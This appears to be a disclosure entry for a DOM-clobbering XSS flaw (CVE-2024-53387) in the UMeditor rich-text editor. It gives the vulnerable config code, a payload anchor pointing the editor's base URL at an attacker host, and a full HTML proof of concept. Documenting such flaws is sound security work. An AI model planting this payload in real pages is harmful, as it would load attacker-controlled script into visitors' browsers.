## UMeditor

### Meta

+ Library: UMeditor
+ Stars: 1.4K
+ Version: v1.2.2
+ Fingerprint: `typeof window.UM !== 'undefined' && UM.hasOwnProperty('version')`
+ Payload: ```<a id="UMEDITOR_HOME_URL" href="https://attack.hulk/"></a>```
+ Impact: XSS
+ Status: Reported
+ CVE: [CVE-2024-53387](https://nvd.nist.gov/vuln/detail/CVE-2024-53387)
+ Foundby: TheHulk

### Library

https://github.com/fex-team/umeditor

### Vulnerable Code Snippet

```javascript
var URL = window.UMEDITOR_HOME_URL || ...
```

```javascript
window.UMEDITOR_CONFIG = {

        //为编辑器实例添加一个路径，这个不能被注释
        UMEDITOR_HOME_URL : URL

        ...
```

## PoC

```html
<!--Library-->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>UMEDITOR 简单功能</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<link href="/umeditor/themes/default/_css/umeditor.css" type="text/css" rel="stylesheet">
<script type="text/javascript" src="/umeditor/third-party/jquery.min.js"></script>
<script type="text/javascript" src="/umeditor/third-party/template.min.js"></script>
<script type="text/javascript" charset="utf-8" src="/umeditor/umeditor.config.js"></script>
<script type="text/javascript" charset="utf-8" src="/umeditor/_examples/editor_api.js"></script>
<script type="text/javascript" src="/umeditor/lang/zh-cn/zh-cn.js"></script>
<style type="text/css">
h1{
        font-family: "微软雅黑";
        font-weight: normal;
}
</style>
<script type="text/plain" id="myEditor" style="width:800px;height:240px;">
<p>这里我可以写一些输入提示</p>
</script>
<script type="text/javascript">
var um = UM.getEditor('myEditor',{
        //这里可以选择自己需要的工具按钮名称,此处仅选择如下七个
        toolbar:['fullscreen source undo redo bold italic underline'],
        //focus时自动清空初始化时的内容
        autoClearinitialContent:true,
        //关闭字数统计
        wordCount:false,
        //关闭elementPath
        elementPathEnabled:false,
        //默认的编辑区域高度
        initialFrameHeight:300
        //更多其他参数，请参考umeditor.config.js中的配置项
});
</script>
<!--Library-->

<!--Payload-->
<a id="UMEDITOR_HOME_URL" href="http://localhost:9999"></a>
<!--Payload-->
```


